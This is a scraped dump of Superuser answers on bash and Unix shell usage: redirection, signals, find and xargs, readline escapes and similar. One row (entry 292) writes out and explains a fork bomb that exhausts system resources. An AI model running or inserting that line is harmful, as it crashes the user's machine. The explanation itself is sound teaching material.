278,https://superuser.com/questions409150/,"['That, unfortunately, is up to bash, not to the terminal. Your options are:', ""Use semicolons instead of newlines, although even then you can't move up a screen line at a time but must use character or word motion commands.  (Oddly, zsh at least lets you move within a compound command when editing history, just not within the current command.)  Sometimes fc (which tosses you into your editor with the previous command) is the easiest way to handle compound commands."", 'If you are using Bash, use the following key combination:', ""It will open up the command you are working on using your text editor.  Save the file and quit. (I found the command on the Shell Hater's presentation.)\nZsh users have this alternative. ""]","[<code>bash</code>, <code>zsh</code>, <code>fc</code>, <code>ctrl x e
</code>]"
279,https://superuser.com/questions451340/,['Vim has an internal strftime() function.  Try this (in insert mode):'],"[<code>strftime()</code>, <code>&lt;C-r&gt;=strftime('%F')&lt;CR&gt;
</code>]"
280,https://superuser.com/questions228801/,"['Yes.', 'Where script is the script to monitor the time for.', 'For instance, time find ~ will output something like this (Depending on the size of your home directory, that is): ']","[<code> time script
</code>, <code>script</code>, <code>time find ~</code>, <code>real    0m49.139s
user    0m0.663s
sys     0m4.129s
</code>]"
281,https://superuser.com/questions160388/,"[""Those aren't features of bash, they're features of the terminal driver. As such, they're specified by stty(1).""]","[<code>stty(1)</code>, <code>$ stty -a
speed 38400 baud; rows 24; columns 80; line = 0;
intr = ^C; quit = ^\; erase = ^?; kill = ^U; eof = ^D; eol = M-^?; eol2 = M-^?;
swtch = M-^?; start = ^Q; stop = ^S; susp = ^Z; rprnt = ^R; werase = ^W;
lnext = ^V; flush = ^O; min = 1; time = 0;
-parenb -parodd cs8 hupcl -cstopb cread -clocal -crtscts
-ignbrk brkint -ignpar -parmrk -inpck -istrip -inlcr -igncr icrnl ixon -ixoff
-iuclc ixany imaxbel iutf8
opost -olcuc -ocrnl onlcr -onocr -onlret -ofill -ofdel nl0 cr0 tab0 bs0 vt0 ff0
isig icanon iexten echo echoe echok -echonl -noflsh -xcase -tostop -echoprt
echoctl echoke
</code>]"
282,https://superuser.com/questions386199/,"['This is both recursive and handles any file name. Downside is that it requires version 4.x for the ability to use associative arrays and recursive searching. Remove the echo if you like the results.', 'Note that this will still break on files that have double-quotes in their name. No real way to get around that with awk. Remove the echo if you like the results.']","[<code>#!/bin/bash
declare -A arr
shopt -s globstar

for file in **; do
  [[ -f ""$file"" ]] || continue
   
  read cksm _ &lt; &lt;(md5sum ""$file"")
  if ((arr[$cksm]++)); then 
    echo ""rm $file""
  fi
done
</code>, <code>echo</code>, <code>gawk '
  {
    cmd=""md5sum "" q FILENAME q
    cmd | getline cksm
    close(cmd)
    sub(/ .*$/,"""",cksm)
    if(a[cksm]++){
      cmd=""echo rm "" q FILENAME q
      system(cmd)
      close(cmd)
    }
    nextfile
  }' q='""' *
</code>, <code>awk</code>, <code>echo</code>]"
283,https://superuser.com/questions345602/,"['start with the /B option', 'Start application without creating a new window. The application has ^C handling ignored. Unless the application enables ^C processing, ^Break is the only way to interrupt the application']","[<code>/B</code>, <code>start /B java -jar jarfile1.jar

start /B java -jar jarfile2.jar
</code>]"
284,https://superuser.com/questions464290/,"['http://en.wikipedia.org/wiki/Stat_(system_call)', 'Criticism of atime', 'Writing to a file changes its mtime and ctime, while reading a file changes its atime. As a result, on a POSIX-compliant system, reading a file causes a write, which has been criticized. This behaviour can usually be disabled by adding a mount option in /etc/fstab.', 'However, turning off atime updating breaks POSIX compliance, and some applications, notably the mutt mail reader (in some configurations), and some file usage watching utilities, notably tmpwatch. In the worst case, not updating atime can cause some backup programs to fail to back up a file.', 'Linux kernel developer Ingo Molnár called atime ""perhaps the most stupid Unix design idea of all times,"" adding: ""[T]hink about this a bit: \'For every file that is read from the disk, lets do a ... write to the disk! And, for every file that is already cached and which we read from the cache ... do a write to the disk!\'"" He further emphasized the performance impact thus:', 'Atime updates are by far the biggest IO performance deficiency that Linux has today. Getting rid of atime updates would give us more everyday Linux performance than all the pagecache speedups of the past 10 years, combined.', 'how to know if noatime or relatime is default mount option in kernel?', 'Which is how that particular partition was mounted and why cat does not update the access time as I expected. ']","[<code>man mount
....
   relatime
          Update inode access times relative to  modify  or  change  time.
          Access time is only updated if the previous access time was ear‐
          lier than the current modify or change time. (Similar  to  noat‐
          ime,  but  doesn't break mutt or other applications that need to
          know if a file has been read since the last time  it  was  modi‐
          fied.)

          Since Linux 2.6.30, the kernel defaults to the behavior provided
          by this option (unless noatime was  specified), and the stricta‐
          time  option  is  required  to  obtain traditional semantics. In
          addition, since Linux 2.6.30, the file's  last  access  time  is
          always  updated  if  it  is more than 1 day old.
....
</code>]"
285,https://superuser.com/questions802539/,"[""I've solved the problem with the bash ${var:+...} syntax, (reference)."", 'The script now changes to', 'which works perfectly.', 'Also see:']","[<code>${var:+...}</code>, <code>curl \
    ${title:+ --data-urlencode ""title=${title}""} \
    http://example.com
</code>]"
286,https://superuser.com/questions503784/,"['You can temporarily copy your .bashrc to your remote machine with another name. For example, using .bashrc_temp:', 'Afterwards you can log into the remote machine:', 'and source the file .bashrc_temp:', 'Now you are able to use your .bashrc and your functions. When you are finished with your work you can remove the file ~/.bashrc_temp on the remote machine and logout.', 'The copying of the file and the login to the remote machine may be achieved with a bash function:', 'Update: ', 'You may also consider to copy the .bashrc to /tmp on your remote machine and source /tmp/.bashrc_temp.', 'Update 2:', 'You can log into the remote machine by using ssh -t. This will automatically use your temp .bashrc. Updated function s():']","[<code>.bashrc</code>, <code>.bashrc_temp</code>, <code>user@local$ scp .bashrc user@remote:~/.bashrc_temp
</code>, <code>user@local$ ssh user@remote
</code>, <code>source</code>, <code>.bashrc_temp</code>, <code>user@remote$ source ~/.bashrc_temp
</code>, <code>.bashrc</code>, <code># copy the .bashrc to the remote machine 
# and log into the remote machine.
# parameter $1: user@remote
function s() {
  scp ~/.bashrc $1:~/.bashrc_temp
  ssh $1
}
</code>, <code>.bashrc</code>, <code>/tmp</code>, <code>/tmp/.bashrc_temp</code>, <code>.bashrc</code>, <code>s()</code>, <code>function s() {
  scp ~/.bashrc $1:/tmp/.bashrc_temp
  ssh -t $1 ""bash --rcfile /tmp/.bashrc_temp ; rm /tmp/.bashrc_temp""
}
</code>]"
287,https://superuser.com/questions288621/,"[""@Nitrodist's answer will work, but it's over-engineering the problem. MySQL's command-line client supports the very handy -e switch, like so:"", 'You can of course substitute any valid SQL into there.']","[<code>-e</code>, <code>mysql -uroot -e ""create database 'foo'""
</code>]"
288,https://superuser.com/questions269429/,"[""You don't need the semicolon.  After it's sent to the background it's free to get another command.""]","[<code>evince foo.pdf bar.pdf &amp; emacs foo.tex &amp;
</code>]"
289,https://superuser.com/questions857250/,"['Your problem is in your first line. You have this:', 'which explicitly states that the shell script should be ran with the old /bin/bash.\nWhat you really want, is this:', 'to use the new bash from /usr/local/bin.']","[<code>#!/bin/bash
</code>, <code>/bin/bash</code>, <code>#!/usr/local/bin/bash
</code>, <code>bash</code>, <code>/usr/local/bin</code>]"
290,https://superuser.com/questions334549/,"[""It's an equivalent of the command test. (See info test.) Generally you use it in scripts in conditional expressions like:"", 'The closing bracket is required to enclose the conditional. (Well, it looks like its required just to look nicer in the code. Does anybody know any other practical reason for it?)']","[<code>test</code>, <code>info test</code>, <code>if [ -n ""$1"" ]; then
    echo $1
fi
</code>]"
291,https://superuser.com/questions1312740/,"['I have downloaded an archive file and an accompanying checksum file.\nHere is how I verify that the hash of the downloaded archive matches the hash from the downloaded checksum file:', ""The --status flag prevents all stdout output (more effective than --quiet). I then need to rely on the return code to determine if they matched, which is what I want anyway since I'm going to be using this in a script.""]","[<code>echo ""$(cat archive.tar.gz.sha256) archive.tar.gz"" | sha256sum --check --status
</code>, <code>--status</code>, <code>--quiet</code>]"
292,https://superuser.com/questions166755/,"[""It's, as you said, a forkbomb. What it does is define a function, then call it. The function is called :."", ""Let's name it forkbomb so we can better see what's going on:"", 'As you can see, and probably guess from your programming experience, the first part is the function definition (forkbomb(){ ... }), and the very last : is where the function gets called (the ; just separates statements in Bash).', 'Now, what does this function do? If you\'re familiar with Bash, you\'ll know that the | character pipes the standard output of one command/program to the standard input of another. So basically, :|: starts up two instances of the function (this is where it ""forks"").', ""And then the magic: the & puts those commands in the background, allowing the original function to return, while each instance forks 'til the cows come home in the background, thus using up all your resources and taking down the system (unless it has limits imposed on it).""]","[<code>:</code>, <code>forkbomb</code>, <code>forkbomb(){ forkbomb|forkbomb&amp; };forkbomb
</code>, <code>forkbomb(){ ... }</code>, <code>:</code>, <code>;</code>, <code>|</code>, <code>:|:</code>, <code>&amp;</code>]"
293,https://superuser.com/questions1602243/,"['From man 1 watch:', '-g, --chgexit\nExit when the output of command changes.', ""watch is not required by POSIX but it's quite common anyway. In Debian or Ubuntu it's in the procps package along with kill and ps (and few other tools)."", 'Example:']","[<code>man 1 watch</code>, <code>-g</code>, <code>--chgexit</code>, <code>watch</code>, <code>procps</code>, <code>kill</code>, <code>ps</code>, <code>watch -g -n 5 'date +%H:%M'
</code>]"
294,https://superuser.com/questions343965/,"[""The screen password has always been simply the system password of the user running it in my experience.\nthe manpage says that if there's a screen lock program available, it will be used if configured so. So maybe you would need to figure out if this is the case, and how that program behaves.""]",[]
295,https://superuser.com/questions107543/,"['kill just sends a signal to the given process. The -9 tells it which signal to send.', 'Different numbers correspond to different common signals. SIGINT, for example, is 2, so to send a process the SIGINT signal issue the command', 'The manpage here specifies:', 'The  default  signal  for  kill is TERM.', 'The manpage also provides a table of signals you can send.  According to this table, TERM is 15, so these are all equivalent:', 'Notice 9 is the KILL signal.']","[<code>kill</code>, <code>-9</code>, <code>SIGINT</code>, <code>SIGINT</code>, <code>$ kill -2 &lt;pid&gt;
</code>, <code>TERM</code>, <code>15</code>, <code>kill &lt;pid&gt;
kill -15 &lt;pid&gt;
kill -TERM &lt;pid&gt;
</code>, <code>KILL</code>, <code>   Name   Number  Action
   -----------------------
   ALRM      14   exit
   HUP        1   exit
   INT        2   exit
   KILL       9   exit  this signal may not be blocked
   PIPE      13   exit
   POLL           exit
   PROF           exit
   TERM      15   exit     [Default]
   USR1           exit
   USR2           exit
   VTALRM         exit
   STKFLT         exit  may not be implemented
   PWR            ignore    may exit on some systems
   WINCH          ignore
   CHLD           ignore
   URG            ignore
   TSTP           stop  may interact with the shell
   TTIN           stop  may interact with the shell
   TTOU           stop  may interact with the shell
   STOP           stop  this signal may not be blocked
   CONT           restart   continue if stopped, otherwise ignore
   ABRT       6   core
   FPE        8   core
   ILL        4   core
   QUIT       3   core
   SEGV      11   core
   TRAP       5   core
   SYS            core  may not be implemented
   EMT            core  may not be implemented
   BUS            core  core dump may fail

   XCPU           core  core dump may fail
   XFSZ           core  core dump may fail
</code>]"
296,https://superuser.com/questions199869/,"['The Nagios plugin /usr/lib/nagios/plugins/check_apt does not detect critical updates in Ubuntu correctly due how it detects critical updates via apt combined with how Ubuntu non-critical updates are published. More details are in the bug here: https://bugs.launchpad.net/bugs/1031680', 'Using /usr/lib/update-notifier/apt-check instead is a reliable workaround.']","[<code>/usr/lib/nagios/plugins/check_apt</code>, <code>apt</code>, <code>/usr/lib/update-notifier/apt-check</code>]"
297,https://superuser.com/questions240223/,"['You need to source that script. Do . ./bind or source ./bind to make that key binding active in the current session.', ""Running it normally, it doesn't have a terminal so it gives you that error message. Also, if it were to work, it would only be active for the duration of the script."", 'If you want that keybinding to be persistent, add that command to your ~/.bashrc.']","[<code>. ./bind</code>, <code>source ./bind</code>, <code>~/.bashrc</code>]"
298,https://superuser.com/questions834959/,"['Very simple:', 'That is, if your out.txt file contains one filename per line. It will add all the files from out.txt to one archive called archive.zip.', 'The -@ option makes zip read from STDIN.', ""If you want to skip creating a temporary out.txt file, you can use grep's capability to print filenames, too. -r enables recursive search (might not be necessary in your case) and -l prints only filenames:""]","[<code>zip archive -@ &lt; out.txt
</code>, <code>out.txt</code>, <code>out.txt</code>, <code>archive.zip</code>, <code>-@</code>, <code>zip</code>, <code>out.txt</code>, <code>grep</code>, <code>-r</code>, <code>-l</code>, <code>grep -rl ""abc"" file-* | zip archive -@
</code>]"
299,https://superuser.com/questions196166/,"[""As the other answer says there are some programs that don't look at the system at all you may have to set them up individually. For instance wget has a number of proxy options, that can be used to ignore or adapt the environmental proxy config during execution. Here are a number of areas in which the systems proxys can be set up. "", 'Some Linux systems use /etc/environment', 'There is no uniform single set up other use env', 'I would check out the ~/.bashrc to have setting applied automatically on system start up. ']","[<code>$ cat /etc/environment 
PATH=""/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games""
http_proxy=""http://192.168.1.250:8080/""
ftp_proxy=""ftp://192.168.1.250:8080/""
https_proxy=""https://192.168.1.250:8080/""  
</code>, <code>$ env | grep -i proxy
NO_PROXY=localhost,127.0.0.0/8,127.0.1.1
http_proxy=http://192.168.1.250:8080/
FTP_PROXY=ftp://192.168.1.250:8080/
ftp_proxy=ftp://192.168.1.250:8080/
all_proxy=socks://192.168.1.250:8080/
ALL_PROXY=socks://192.168.1.250:8080/
HTTPS_PROXY=https://192.168.1.250:8080/
https_proxy=https://192.168.1.250:8080/
no_proxy=localhost,127.0.0.0/8,127.0.1.1
HTTP_PROXY=http://192.168.1.250:8080/  
</code>, <code>$ man env
$ man set
$ # The file section near the end of the bash manual.
$ man bash 

FILES
       /bin/bash
              The bash executable
       /etc/profile
              The systemwide initialization file, executed for login shells
       /etc/bash.bashrc
              The systemwide per-interactive-shell startup file
       /etc/bash.bash.logout
              The systemwide login shell cleanup file, executed when  a  login
              shell exits
       ~/.bash_profile
              The personal initialization file, executed for login shells
       ~/.bashrc
              The individual per-interactive-shell startup file
       ~/.bash_logout
              The  individual  login shell cleanup file, executed when a login
              shell exits
       ~/.inputrc
              Individual readline initialization file
</code>]"
300,https://superuser.com/questions155167/,"['echo ""set mark-symlinked-directories on"" >> ~/.inputrc', 'Ctrl+x, then Ctrl+r', 'via Ubuntu Forums - Strange bash shell tab completion behaviour']","[<code>echo ""set mark-symlinked-directories on"" &gt;&gt; ~/.inputrc</code>]"
301,https://superuser.com/questions1165820/,"['Ordinarily the function of echo command is to display a string (piece of text) on the console. But this time, a > character is added after the echo command, redirecting its output to a text file, /etc/apt/sources.list.d/ros-latest.list.', 'So basically, this whole command writes a piece of text to a text file. Now, here comes the tricky part:', 'The string written to the file may be different for each computer. The part $(lsb_release -sc) is resolved (changed into something else) when the echo command runs.', 'You can open /etc/apt/sources.list.d/ros-latest.list in a text editor before and after the command to see the change for yourself. (The file might not exist before this command.)']","[<code>echo</code>, <code>&gt;</code>, <code>echo</code>, <code>/etc/apt/sources.list.d/ros-latest.list</code>, <code>$(lsb_release -sc)</code>, <code>echo</code>, <code>/etc/apt/sources.list.d/ros-latest.list</code>]"
302,https://superuser.com/questions547883/,"['This issue is resolved in the current version of tmux. When there are only two splits the upper/lower half of the split line is colored to indicate that the left/right split is active', '']",[]
303,https://superuser.com/questions176404/,"['When Bash starts as an interactive login shell, one of the files it may process is ~/.profile.', ""When it starts as an interactive non-login shell it doesn't. It processes /etc/bash.bashrc (if that file or a similar file is enabled in your version of Bash) and  ~/.bashrc."", 'You could add the following to your ~/.bashrc (but be careful of loops or values being changed inadvertently):']","[<code>~/.profile</code>, <code>/etc/bash.bashrc</code>, <code>~/.bashrc</code>, <code>~/.bashrc</code>, <code>. $HOME/.profile
</code>]"
304,https://superuser.com/questions713741/,"['No that would give you ""missing operand"" since you didn\'t specify anything. Putting a * would prompt also for files.', ""I'd give a try to:"", 'The mindepth 1 will exclude . from the results, the maxdepth 1 will exclude trying to do under the directories that will anyway get deleted (therefore creating a warning). But in practice you could leave them both out if you agree to have a few ""innocent"" warnings.']","[<code>*</code>, <code>find -mindepth 1 -maxdepth 1 -type d -exec rm -r {} \;
</code>, <code>mindepth 1</code>, <code>.</code>, <code>maxdepth 1</code>]"
305,https://superuser.com/questions317819/,"[""I think you want 'Process Substitution' http://tldp.org/LDP/abs/html/process-sub.html.  It  also works on zsh, though it has more options and the syntax may be different."", ""It creates a pseudo file (/dev/fd/something) for each substitution. It's pretty useful. The command can only read as a stream, meaning it can not go back and forth with fseek. It needs to read it as a stream of bytes, like a pipe."", 'Your examples work as process substitution:', 'Think of it as a tool to use a process and have it pretend to be a file without any temp files.', '(from my earlier answer )']","[<code>/dev/fd/something</code>, <code>cat &lt;(echo abc) &lt;(echo xyz)
paste -d, &lt;(cut -f2 -d, file1) &lt;(cut -f1 -d, file2)
</code>]"
306,https://superuser.com/questions301353/,"['The readline library accepts \\001 and \\002 (ASCII SOH and STX) as non-printable text delimiters. These also work in any application that uses readline.', 'From lib/readline/display.c:243 in bash source code:', 'The bash-specific \\[ and \\] are in fact translated to \\001 and \\002 at y.tab.c:7640.', 'Note: If you use bash\'s printf or echo -e, and if your text has \\001 or \\002 immediately before a number, you\'ll hit a bash bug that causes it to eat one digit too many when processing octal escapes – that is, \\00142 will be interpreted as octal 014 (followed by ASCII ""2""), instead of the correct octal 01 (followed by ASCII ""42""). For this reason, use hexadecimal versions \\x01 and \\x02 instead.']","[<code>\001</code>, <code>\002</code>, <code>lib/readline/display.c:243</code>, <code>243 /* Current implementation:
244         \001 (^A) start non-visible characters
245         \002 (^B) end non-visible characters
246    all characters except \001 and \002 (following a \001) are copied to
247    the returned string; all characters except those between \001 and
248    \002 are assumed to be `visible'. */
</code>, <code>\[</code>, <code>\]</code>, <code>\001</code>, <code>\002</code>, <code>y.tab.c:7640</code>, <code>printf</code>, <code>echo -e</code>, <code>\001</code>, <code>\002</code>, <code>\00142</code>, <code>\x01</code>, <code>\x02</code>]"
307,https://superuser.com/questions235761/,"['Use && operator,', 'In shellscripting, && and || operators are modelled after optimized implementation of logical operators in C. && means AND operator, and || means OR. Unix is tightly related to C, and in C, the second operand of logical operators isn\'t evaluated if the result is already known from the first operand. E.g. ""false\xa0&&\xa0x"" is false for any x, so there is no need to evaluate x (especially if x is a function call); similarly for ""true\xa0||\xa0x"". This is also called short-circuiting semantics.', 'And in Unix, it is traditional to interpret commands\' return values as ""successful completion"" truth values: exit code 0 means true (success), nonzero means false (failure). So, when the first command in cmd1\xa0&&\xa0cmd2 returns ""false"" (nonzero exit status, which indicates failure), the compound command\'s status is known: failure. So overall interpretation of cmd1 && cmd2  may be: ""execute cmd1, AND THEN, if it didn\'t fail, cmd2"". Which is what you basically want in your question.', 'Similarly with OR: cmd1\xa0||\xa0cmd2 can be interpreted as ""execute cmd1, OR IF it fails, cmd2"".', 'Protip: for longer chains of &&, consider putting set -e in your script. It basically changes the semicolon ; into &&, with a couple of special cases.']","[<code>&amp;&amp;</code>, <code>cmd1 &amp;&amp; cmd2 &amp;&amp; cmd3
</code>, <code>&amp;&amp;</code>, <code>||</code>, <code>&amp;&amp;</code>, <code>||</code>, <code>""false &amp;&amp; x""</code>, <code>false</code>, <code>x</code>, <code>x</code>, <code>x</code>, <code>""true || x""</code>, <code>true</code>, <code>false</code>, <code>cmd1 &amp;&amp; cmd2</code>, <code>""false""</code>, <code>cmd1 &amp;&amp; cmd2</code>, <code>cmd1</code>, <code>cmd2</code>, <code>cmd1 || cmd2</code>, <code>cmd1</code>, <code>cmd2</code>, <code>&amp;&amp;</code>, <code>set -e</code>, <code>;</code>, <code>&amp;&amp;</code>]"
308,https://superuser.com/questions474334/,"['Assuming you want a recursive count of files only, not directories and other types, something like this should work:']","[<code>find . -maxdepth 1 -mindepth 1 -type d | while read dir; do
  printf ""%-25.25s : "" ""$dir""
  find ""$dir"" -type f | wc -l
done
</code>]"
309,https://superuser.com/questions269464/,"['These are ANSI control-code escape sequences that are transmitted when various non alphanumeric keys are pressed on a ""terminal"" keyboard.', '\\e means the ASCII ""ESCAPE"" character (octal 033 hex 1B decimal 27). Which is part of a command sequence \nintroduction (CSI).', 'Escape [ 2 ~ is a character sequence transmitted when you press the key labelled ""Insert"" on a VT220 (or later) terminal.', 'Many of these conventions have been adopted in software such as xterm and Linux consoles / shells - often extended in various, sometimes incompatible ways.', ""The use of these sequences in bash's READLINE function is described in the man pages for readline"", 'To get a list of which escape sequences correspond to which keyboard-keys, you can use a command such as infocmp -L -1 or infocmp -L -1 xterm']","[<code>Escape [ 2 ~</code>, <code>infocmp -L -1</code>, <code>infocmp -L -1 xterm</code>]"
310,https://superuser.com/questions704032/,"['Assuming the run command stays running on the foreground, you can most probably end it with CTRL+C. Then the shell (and SSH) session can be terminated with exit or CTRL+D.']","[<code>run</code>, <code>CTRL+C</code>, <code>exit</code>, <code>CTRL+D</code>]"
311,https://superuser.com/questions728800/,"['Quick Answer', 'Explanation', 'First, create the file:', 'Then, add the contents to the file:', 'touch creates an empty file (assuming that the ~/.inputrc file does not already exist). echo writes text to the ""standard output"" (""stdout"" for short), which is normally your screen, but because of the redirection (>>), the output is redirected to ~/.inputrc. This setup will append the line to the file.', 'If ~/.inputrc already exists and you want to erase (clobber) its contents, and then write the line into it (i.e., create a file with only this line of text), do:', 'The single arrow (>), a.k.a. ""greater than"" symbol, tells echo to create a file with only the given text as the contents of the file, instead of writing the contents to the end of the file. (Actually, echo does not create the file; the shell creates the file, discarding any existing contents, and the echo command writes the new contents.)', 'If you use the first approach (with the >>) and you find that the line that you added is smushed onto the previous line, e.g.,', 'then you need to edit the file to fix it.\nThis would happen if the last line of the pre-existing file ended with a textual character rather than a ""newline"" character (i.e., an end-of-line marker). This is common for .TXT files on Windows, but rare on *nix.', 'If you somehow realize in advance that your .inputrc file has pre-existing contents that do not end with a newline,\nthen you should use this echo statement instead:', 'The \\n before the phrase is interpreted as a newline character, so a newline is added after the previous contents and before the new stuff you want to add.', 'Or, slightly more typing but much more readable,', 'or', 'which do the same thing; i.e., provide the missing newline character to the existing text, and then add the set completion-… command after that.']","[<code>touch ~/.inputrc
echo ""set completion-ignore-case On"" &gt;&gt; ~/.inputrc
</code>, <code>touch ~/.inputrc
</code>, <code>echo ""set completion-ignore-case On"" &gt;&gt; ~/.inputrc
</code>, <code>touch</code>, <code>~/.inputrc</code>, <code>echo</code>, <code>&gt;&gt;</code>, <code>~/.inputrc</code>, <code>~/.inputrc</code>, <code>echo ""set completion-ignore-case On"" &gt; ~/.inputrc
</code>, <code>&gt;</code>, <code>echo</code>, <code>echo</code>, <code>echo</code>, <code>&gt;&gt;</code>, <code>.TXT</code>, <code>.inputrc</code>, <code>echo</code>, <code>echo -e ""\nset completion-ignore-case On"" &gt;&gt; ~/.inputrc
</code>, <code>\n</code>, <code>echo """" &gt;&gt; ~/.inputrc
echo ""set completion-ignore-case On"" &gt;&gt; ~/.inputrc
</code>, <code>(echo """"; echo ""set completion-ignore-case On"") &gt;&gt; ~/.inputrc
</code>, <code>set completion-…</code>]"
312,https://superuser.com/questions207453/,"['The exit in the shell script does not work because it is exiting from the script, not the shell. To exit from the shell after the script completes do', 'This will run the script then exit from the shell.']","[<code>ssh user@ipaddress '~/my_script.sh &amp;&amp; exit'
</code>]"
313,https://superuser.com/questions71446/,"['You can ""dot source"" in PowerShell as well. You just need to make sure that you specify the full path. So, if the script you want to load is in the local directory you would do:']","[<code>PS C:\&gt;. .\myscript.ps1
</code>]"
314,https://superuser.com/questions153630/,"['GNU Parallel is made for this.', ""It can even run jobs on remote computers. Here's an example for re-encoding an MP3 to OGG using server2 and local computer running 1 job per CPU core:"", 'Watch an intro video to GNU Parallel here:', 'http://www.youtube.com/watch?v=OpaiGYxkSuQ']","[<code>seq 1 1000 | parallel -j20 do_something
</code>, <code>parallel --trc {.}.ogg -j+0 -S server2,: \
     'mpg321 -w - {} | oggenc -q0 - -o {.}.ogg' ::: *.mp3
</code>]"
315,https://superuser.com/questions45592/,"['Just use the date command with -d option: ', 'You can change the output format if you want:']","[<code>date</code>, <code>-d</code>, <code>$ date -d ""1983-08-04 348 days""
Tue Jul 17 00:00:00 BST 1984  
</code>, <code>$ date -d ""1983-08-04 2 days"" +%Y-%m-%d
1983-08-06                                           
</code>]"
316,https://superuser.com/questions394153/,"[""This type of behavior is caused by a tool frequently installed on some distributions that hook into bash.  This hook makes it so that if you try to run a command, and the command doesn't exist, then bash will search the files available in the configured repositories, and tell you what package you would need to install to get that command."", ""If you are not on a Debian system you'll want to look at your bash startup files profiles and so on and see if anything defines the function named command_not_found_handle.  If that bash function is defined, then it will be called whenever you run a command and an appropriate program cannot be found in your search path.  If you run typset | less and browse through the output you will see the command_not_found_handle() function if it has been defined."", 'On Debian/Ubuntu the package that provides this behavior is command-not-found.  If you purge that, then you will disable the lookups which does slow things down.', 'Here is an example', 'The exact time would of course be different for you.  I ran my tests on a pretty beefy server.']","[<code>command_not_found_handle</code>, <code>typset | less</code>, <code>command_not_found_handle()</code>, <code># command-not-found installed
$ time pwgen
The program 'pwgen' is currently not installed.  To run 'pwgen' please ask your administrator to install the package 'pwgen'
pwgen: command not found

real    0m0.074s
user    0m0.032s
sys     0m0.040s

# purge command-not-found and restart bash
$ time pwgen
-bash: pwgen: command not found

real    0m0.002s
user    0m0.000s
sys     0m0.000s
</code>]"
317,https://superuser.com/questions868379/,"['This does what you are looking for:', 'This uses find rather than ls because, generally, parsing ls output is unreliable.  This form, using find, however, will work with filenames even if they contain newlines or other difficult characters.', 'Explanation', 'find . -maxdepth 1 -type f -print0', ""This selects the files.  This can be customized using any of find's many options.  The option print0 tells find to print the file names in a null-separated list.  This is the only reliable to transmit lists of file names."", 'xargs -L1 -p0 chmod +x', 'This takes the null-separated list of file names generated by find and applies your command to them.', 'The -L1 option tells xargs to work on only one file name at a time.  The -p option tells xargs to prompt for approval before continuing.  The -0 option tells xargs to use the null character as the delimiter between file names.', '[I was unaware of the -p option to xargs until @kwan pointed it out.]']","[<code>find . -maxdepth 1 -type f -print0 | xargs -L1 -p0 chmod +x
</code>, <code>find</code>, <code>ls</code>, <code>ls</code>, <code>find</code>, <code>find . -maxdepth 1 -type f -print0</code>, <code>print0</code>, <code>find</code>, <code>xargs -L1 -p0 chmod +x</code>, <code>find</code>, <code>-L1</code>, <code>xargs</code>, <code>-p</code>, <code>xargs</code>, <code>-0</code>, <code>xargs</code>, <code>-p</code>, <code>xargs</code>]"
318,https://superuser.com/questions465495/,"['There is no such thing as a ""Default File Manager for Linux"". It all depends how you might be trying to open one. If you ask XDG, then you\'ll have to check what XDG thinks this file manager should be. Same deal for any other ""environment"", such as Gnome, or KDE. If you have all of them installed, it\'s perfectly possible (and fine) for each of them to have a different ""default file manager"".', 'The case for default apps seems to come mainly from Windows. Over there, we only have one environment, the one Windows presents us with. As such, the notion of a default application is indeed effectively system wide. This is not the case with Linux.', 'What you might perceive as default apps under Linux, such as what is stored in the $EDITOR environment variable, is not as much a ""true"" default app, as simply a convention used by a lot of people who write system tools and scripts. Feel free to define $FILEMANAGER, if that suits your use case.']",[]
319,https://superuser.com/questions600667/,"['seq is part of coreutils.', 'Output:', 'If you provide only 2 arguments to seq, the increment is 1:']","[<code>seq</code>, <code>for i in $( seq 1 2 11 ) ; do echo $i ; done
</code>, <code>1
3
5
7
9
11
</code>, <code>seq</code>, <code>$ seq 4 9
4
5
6
7
8
9
</code>]"
320,https://superuser.com/questions286911/,"['Simply with output redirection:', 'Basically, this will take the output of system_profiler and save it to the file file.txt. There are technically two different output ""streams"", standard output, and standard error. They are treated separately, and if you use the simple redirection method above, you will only redirect standard output to the file. If you want to redirect both standard output and standard error, you could do this:', 'The & tells the shell to redirect the standard output and standard error to the file.', 'If you want to just output standard error, you can do this:', 'The 2 lets the shell know that it needs to only redirect standard error.', ""Using the > will overwrite the file if it's already there. If you want to append it to a file without erasing the old one, you can use >>, like so:"", 'You can of course use the & and 2 for sending both standard out and standard error, and just standard error with the >> operator.']","[<code>system_profiler &gt; file.txt
</code>, <code>system_profiler</code>, <code>file.txt</code>, <code>system_profiler &amp;&gt; file.txt
</code>, <code>&amp;</code>, <code>system_profiler 2&gt; file.txt
</code>, <code>2</code>, <code>&gt;</code>, <code>&gt;&gt;</code>, <code>system_profiler &gt;&gt; file.txt
</code>, <code>&amp;</code>, <code>2</code>, <code>&gt;&gt;</code>]"
321,https://superuser.com/questions657848/,"['These are my thoughts on the different ""types""of shells -- unfortunately I didn\'t witnessed the rise of the Un*x right from the beginning (I assume this concept is grown historically to a good extend), so please be critical.', 'So, my answer to your question What would we lose if we only had one type of shell? is in one word: ""Flexibility.""', 'The answer to your second question is easy:', '$- lists the current set of options. These can either be set by command line parameters to bash or via the set builtin. So you have to look at two places in the manual:', 'OPTIONS section:', 'SHELL BUILTIN COMMANDS section, subsection set:']","[<code>/etc/profile</code>, <code>~/.bash_login</code>, <code>~/.bash_logout</code>, <code>~/.bashrc</code>, <code>bash</code>, <code>$-</code>, <code>bash</code>, <code>set</code>, <code>OPTIONS</code>, <code>-i        If the -i option is present, the shell is interactive.
</code>, <code>SHELL BUILTIN COMMANDS</code>, <code>set</code>, <code>-h      Remember the location of commands as they are looked up for execution.  This is enabled by default.
-m      Monitor  mode.  Job control is enabled.  This option is on by default for interactive shells on systems that sup‐
        port it (see JOB CONTROL above).  Background processes run in a separate process  group  and  a  line  containing
        their exit status is printed upon their completion.
-B      The shell performs brace expansion (see Brace Expansion above).  This is on by default.
-H      Enable !  style history substitution.  This option is on by default when the shell is interactive.
</code>]"
322,https://superuser.com/questions565443/,"['This seems to work pretty well:', 'Its output looks like this:\n\n         0   1\n         8   3\n        16   2\n        32   2\n        64   6\n       128   9\n       256   9\n       512   6\n      1024   8\n      2048   7\n      4096  38\n      8192  16\n     16384  12\n     32768   7\n     65536   3\n    131072   3\n    262144   3\n    524288   6\n   2097152   2\n   4194304   1\n  33554432   1\n 134217728   4\n\nwhere the number on the left is the lower limit of a range from that value to twice that value and the number on the right is the number of files in that range.']","[<code>find . -type f -print0 | xargs -0 ls -l | awk '{size[int(log($5)/log(2))]++}END{for (i in size) printf(""%10d %3d\n"", 2^i, size[i])}' | sort -n
</code>, <code><pre>
         0   1
         8   3
        16   2
